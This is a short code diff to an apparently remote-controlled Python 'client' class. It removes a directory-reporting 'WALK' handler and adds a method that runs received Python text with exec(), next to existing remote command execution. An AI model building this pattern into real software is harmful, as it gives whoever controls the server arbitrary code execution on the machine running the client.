@@ -46,27 +46,11 @@ class client:
         if msg == "TEST":
             return 1
 
-        elif msg == "WALK":
-            self.walk()
-
         passed = self.run_command(msg)
         if not passed:
             return 0
 
         return 1
-
-
-    def walk(self):
-        passed = False
-
-        passed = self.send(os.getcwd())
-
-        if not passed:
-            return 0
-
-        else:
-            while True:
-                passed = self.receive()
 
     def run_command(self, cmd):
         try:
@@ -89,6 +73,13 @@ class client:
         except (ConnectionResetError, ConnectionAbortedError):
             return 0
 
+        return 1
+
+    def python_script(self, script):
+        try:
+            exec(script)
+        except Exception as e:
+            return e
         return 1
 
 
